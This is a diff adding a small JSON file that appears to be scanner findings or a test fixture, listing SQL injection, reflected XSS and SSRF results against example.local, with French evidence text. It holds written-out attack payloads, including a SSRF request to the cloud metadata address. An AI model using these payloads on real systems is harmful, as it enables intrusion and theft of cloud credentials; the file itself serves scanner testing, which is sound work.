@@ -1,0 +1,23 @@
+[
+  {
+    "type": "sqli",
+    "param": "id",
+    "url": "http://example.local/page?id=1%27%20OR%201%3D1--",
+    "payload": "' OR 1=1--",
+    "evidence": "Erreur SQL détectée: sql syntax.*?error"
+  },
+  {
+    "type": "xss",
+    "param": "q",
+    "url": "http://example.local/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
+    "payload": "<script>alert(1)</script>",
+    "evidence": "Reflected payload in response"
+  },
+  {
+    "type": "ssrf",
+    "param": "url",
+    "url": "http://example.local/fetch?url=http://169.254.169.254/latest/meta-data/",
+    "payload": "http://169.254.169.254/latest/meta-data/",
+    "evidence": "Réponse contient des marqueurs de metadata"
+  }
+]
